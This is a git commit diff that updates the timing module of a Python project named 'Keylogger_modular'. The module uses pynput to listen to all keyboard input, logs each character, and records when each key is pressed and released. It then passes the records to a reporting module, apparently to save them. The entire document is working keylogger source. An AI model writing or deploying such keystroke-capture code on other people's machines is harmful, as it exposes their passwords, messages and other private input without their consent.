df0c51ccf9a5f12e46dcd82c7817092c5ef4340c
JulioEscalon <59298247+JulioEscalon@users.noreply.github.com>
2020-08-01 21:30:27 -0500

    Update timing.py

--- Keylogger_modular/timing.py
+++ Keylogger_modular/timing.py
@@ -1,10 +1,17 @@
 from pynput.keyboard import Listener
 from datetime import datetime,time
+from os.path import isfile
+import threading
+import report
 
 class tiempos:
     count=0
     log =""
-    
+    captcha=""
+    keyword=""
+    inicio=""
+    fin=""
+    txt=""
     def appendLog(self,string):
         self.log = self.log + string
         print(self.log)
@@ -12,25 +19,33 @@ class tiempos:
     def recognize(self, key):
             try:
                 otrokey = str(key.char)
+                self.keyword=otrokey
             except AttributeError:
                 if key == key.space:
                     otrokey = " "
                 else:
                     otrokey= " " + str(key) + " " 
             self.appendLog(otrokey)
+    
+    def pressRecord(self,rt):
+        self.captcha=self.keyword+"\t\t\t"+self.inicio+"\t\t"+self.fin
+        rt.timing(self.captcha,rt.setName())
+        self.captcha=""
 
     def pressKey(self, key):
         self.recognize(key)
         if self.count==0:
-            print("La tecla",key,"se presiono:",str(datetime.today()))
+            self.inicio=str(datetime.today())
         self.count=self.count+1
 
     def leaveKey(self, key):
-        print("La tecla",key,"se soltó:",str(datetime.today()))
+        self.fin=str(datetime.today())
+        self.pressRecord(self.txt)
         self.count=0
-   
-    def start(self):
+
+    
+    def start(self,repoTiming):
+        self.txt=repoTiming
         keyboard_listener = Listener(self.pressKey, self.leaveKey)
         with keyboard_listener:
             keyboard_listener.join()
-
